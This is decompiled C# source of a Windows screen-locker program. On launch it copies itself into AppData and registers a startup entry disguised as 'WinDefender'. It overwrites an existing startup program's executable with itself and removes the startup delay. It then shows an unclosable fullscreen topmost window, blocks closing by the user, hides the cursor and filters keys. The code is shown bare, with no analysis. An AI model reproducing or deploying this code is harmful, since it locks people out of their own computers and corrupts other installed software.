using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using BLOCK.Properties;
using Microsoft.Win32;

namespace BLOCK;

public class Form1 : Form
{
	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Cursor.Hide();
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ajso.exe"))
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\reg.reg"))
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\reg.reg");
			}
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = false;
			process = Process.Start("REG", "export HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\reg.reg");
			process.WaitForExit();
			List<string> list = File.ReadLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\reg.reg", Encoding.Default).ToList();
			string text = list[3].Replace('"', ' ').Replace("\\\\", "\\");
			string[] array = text.Split(new char[1] { ' ' });
			string text2 = array[4].Remove(array[4].Length - 1, 1);
			int num = 3;
			try
			{
				while (!File.Exists(text2))
				{
					num++;
					text = list[num].Replace('"', ' ').Replace("\\\\", "\\");
					array = text.Split(new char[1] { ' ' });
					text2 = array[4].Remove(array[4].Length - 1, 1);
				}
			}
			catch (IndexOutOfRangeException)
			{
			}
			catch (ArgumentOutOfRangeException)
			{
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("WinDefender", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ajso.exe");
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\reg.reg");
			if (File.Exists(text2))
			{
				File.Copy(Application.get_ExecutablePath(), text2);
			}
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ajso.exe");
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\", writable: true);
			registryKey2.CreateSubKey("Serialize", writable: true);
			registryKey2.OpenSubKey("Serialize", writable: true);
			registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Serialize\\", writable: true);
			registryKey2.SetValue("StartupDelayInMSec", 0);
		}
		Keys[] array2 = new Keys[8];
		RuntimeHelpers.InitializeArray(array2, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		new KeyboardFilter((Keys[])(object)array2);
	}

	private void Label1_Click(object sender, EventArgs e)
	{
	}

	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		CloseReason closeReason = e.get_CloseReason();
		CloseReason val = closeReason;
		if ((int)val == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		((Form)this).OnFormClosing(e);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)(object)Resources._717309);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Form)this).set_ControlBox(false);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
